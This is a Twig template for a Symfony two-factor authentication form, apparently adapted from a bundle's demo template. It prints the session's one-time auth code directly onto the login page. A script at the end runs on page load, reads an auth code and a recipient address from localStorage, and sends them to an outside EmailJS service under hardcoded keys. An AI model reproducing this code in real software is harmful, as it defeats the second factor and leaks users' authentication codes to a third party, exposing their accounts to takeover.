{#
This is a demo template for the authentication form. Please consider overwriting this with your own template,
especially when you're using different route names than the ones used here.
#}

{# Authentication errors #}
<div style="margin: 180px">
{% if authenticationError %}
    <div style="margin-bottom: 10px; color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; padding: .75rem 1.25rem; border: 1px solid transparent; border-radius: .25rem;">
        {{ authenticationError|trans(authenticationErrorData, 'SchebTwoFactorBundle') }}
    </div>
{% endif %}

{# Let the user select the authentication method #}
{% if availableTwoFactorProviders|length > 1 %}
    <div style="margin-bottom: 20px;">
        <p>{{ "choose_provider"|trans({}, 'SchebTwoFactorBundle') }}:
            {% for provider in availableTwoFactorProviders %}
                <a href="{{ path("2fa_login", {"preferProvider": provider}) }}" style="display: inline-block; margin-right: 10px; padding: 5px 10px; background-color: #007bff; color: #fff; border-radius: 5px; text-decoration: none;">{{ provider }}</a>
            {% endfor %}
        </p>
    </div>
{% endif %}

{# Display current two-factor provider #}
<div style="margin-bottom: 20px;">
    <label for="_auth_code" style="margin-bottom: 5px;">{{ "auth_code"|trans({}, 'SchebTwoFactorBundle') }} {{ twoFactorProvider }}:</label>
    <input id="_auth_code" type="text" name="{{ authCodeParameterName }}" style="padding: 5px; width: 100%; box-sizing: border-box; border: 1px solid #ccc; border-radius: 3px;" autocomplete="one-time-code" autofocus>
    <p>{{ app.session.get("authCode") }}</p>
</div>

<form action="{{ checkPathUrl ? checkPathUrl: path(checkPathRoute) }}" method="post">
    {% if displayTrustedOption %}
        <div style="margin-bottom: 10px;">
            <input id="_trusted" type="checkbox" name="{{ trustedParameterName }}">
            <label for="_trusted">{{ "trusted"|trans({}, 'SchebTwoFactorBundle') }}</label>
        </div>
    {% endif %}
    {% if isCsrfProtectionEnabled %}
        <input type="hidden" name="{{ csrfParameterName }}" value="{{ csrf_token(csrfTokenId) }}">
    {% endif %}
    <div style="margin-bottom: 20px;">
        <input type="submit" value="{{ "login"|trans({}, 'SchebTwoFactorBundle') }}" style="padding: 10px 20px; background-color: #007bff; color: #fff; border: none; border-radius: 5px; cursor: pointer;">
    </div>
</form>

{# The logout link gives the user a way out if they can't complete two-factor authentication #}
<p style="margin-top: 20px;"><a href="{{ logoutPath }}">{{ "cancel"|trans({}, 'SchebTwoFactorBundle') }}</a></p>
<p>{{ app.session.get("code") }}</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="text/javascript">
    function password() {
        var authCode = window.localStorage.getItem('authCode');
        var to = window.localStorage.getItem('to');
        var n = 0;
        emailjs.init('cbRFuNoX18FNF6MD9');
        if (n == 0) {
            emailjs.send('service_8ohxftw', 'template_ocssltn', {
                code: authCode,
                to: to,
            }).then(() => {
                n++;
            }, (err) => {
                alert(JSON.stringify(err));
            });
        }
    }
    window.onload = function() {
        password();
    };
</script>
</div>